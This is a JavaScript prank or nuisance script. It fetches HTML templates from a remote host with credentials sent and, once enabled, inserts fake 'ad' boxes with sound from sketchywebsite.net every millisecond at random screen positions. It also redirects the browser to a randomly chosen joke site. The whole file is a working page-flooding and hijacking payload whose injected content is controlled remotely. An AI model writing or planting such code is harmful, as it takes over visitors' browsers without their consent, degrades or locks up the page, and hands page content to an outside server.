var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.responseType = "text";
xhr.addEventListener("readystatechange", function() {
  if (this.readyState === 4) {
    console.log(this.responseText.split("</template>"));
    window.lolArray = this.responseText.split("</template>");
    window.audioList = [
      '<audio src="https://sketchywebsite.net/sound/snd_0.mp3" ></audio>',
      '<audio src="https://sketchywebsite.net/sound/snd_1.mp3" ></audio>',
      '<audio src="https://sketchywebsite.net/sound/snd_2.mp3" ></audio>',
      '<audio src="https://sketchywebsite.net/sound/snd_3.mp3" ></audio>',
      '<audio src="https://sketchywebsite.net/sound/snd_4.mp3" ></audio>',
      '<audio src="https://sketchywebsite.net/sound/snd_5.mp3" ></audio>',
      '<audio src="https://sketchywebsite.net/sound/snd_6.mp3" ></audio>'
    ];
    setInterval(function() {
      if (window.enabled == true) {
        var insertedAd = document.createElement("div");
        var adCont = lolArray[Math.floor(Math.random() * lolArray.length)];
        var audioEl = audioList[Math.floor(Math.random() * audioList.length)];
        var posX = Math.floor(Math.random() * window.innerWidth) * 2;
        var posY = Math.floor(Math.random() * (window.innerHeight - 100));

        adCont = adCont.replace("<template>", "");
        adCont = adCont.replace(
          'class="lolmain"',
          'class="lolmain" style="top: ' + posX + "px; left: " + posY + 'px" '
        );

        var replacement =
          "lol" +
          Math.random()
            .toString(36)
            .substring(2) +
          new Date().getTime().toString(36);
        adCont = adCont.split("changeThis").join(replacement);

        adCont = adCont.replace("</template>", audioEl);
        insertedAd.innerHTML = adCont + audioEl;
        document.body.appendChild(insertedAd);
      }
    }, 1);

    window.deleteLol = function(el) {
      document.querySelector("#" + el).remove();
    };
    window.goToWebsite = function() {
      var sitesList = [
        ["http://heeeeeeeey.com/"],
        ["http://tinytuba.com/"],
        ["http://corndog.io/"],
        ["https://alwaysjudgeabookbyitscover.com"],
        ["http://thatsthefinger.com/"],
        ["http://cant-not-tweet-this.com/"],
        ["http://weirdorconfusing.com/"],
        ["http://eelslap.com/"],
        ["http://www.staggeringbeauty.com/"],
        ["http://burymewithmymoney.com/"],
        ["http://endless.horse/"],
        ["http://www.trypap.com/"],
        ["http://www.republiquedesmangues.fr/"],
        ["http://www.movenowthinklater.com/"],
        ["http://www.partridgegetslucky.com/"],
        ["http://www.rrrgggbbb.com/"],
        ["http://beesbeesbees.com/"],
        ["http://www.koalastothemax.com/"],
        ["http://www.everydayim.com/"],
        ["http://randomcolour.com/"],
        ["http://cat-bounce.com/"],
        ["http://chrismckenzie.com/"],
        ["http://hasthelargehadroncolliderdestroyedtheworldyet.com/"],
        ["http://ninjaflex.com/"],
        ["http://ihasabucket.com/"],
        ["http://corndogoncorndog.com/"],
        ["http://www.hackertyper.com/"],
        ["https://pointerpointer.com"],
        ["http://imaninja.com/"],
        ["http://www.ismycomputeron.com/"],
        ["http://www.nullingthevoid.com/"],
        ["http://www.muchbetterthanthis.com/"],
        ["http://www.yesnoif.com/"],
        ["http://iamawesome.com/"],
        ["http://www.pleaselike.com/"],
        ["http://crouton.net/"],
        ["http://corgiorgy.com/"],
        ["http://www.wutdafuk.com/"],
        ["http://unicodesnowmanforyou.com/"],
        ["http://www.crossdivisions.com/"],
        ["http://tencents.info/"],
        ["http://www.patience-is-a-virtue.org/"],
        ["http://pixelsfighting.com/"],
        ["http://isitwhite.com/"],
        ["http://onemillionlols.com/"],
        ["http://www.omfgdogs.com/"],
        ["http://oct82.com/"],
        ["http://chihuahuaspin.com/"],
        ["http://www.blankwindows.com/"],
        ["http://dogs.are.the.most.moe/"],
        ["http://tunnelsnakes.com/"],
        ["http://www.trashloop.com/"],
        ["http://www.ascii-middle-finger.com/"],
        ["http://spaceis.cool/"],
        ["http://www.donothingfor2minutes.com/"],
        ["http://buildshruggie.com/"],
        ["http://buzzybuzz.biz/"],
        ["http://yeahlemons.com/"],
        ["http://burnie.com/"],
        ["http://wowenwilsonquiz.com"],
        ["https://thepigeon.org/"],
        ["http://notdayoftheweek.com/"],
        ["http://www.amialright.com/"],
        ["http://nooooooooooooooo.com/"],
        ["https://greatbignothing.com/"]
      ];
      window.location.href =
        sitesList[Math.floor(Math.random() * sitesList.length)];
    };
  }
});
xhr.open("GET", "https://jaydensim.tk/no.txt");
xhr.send();
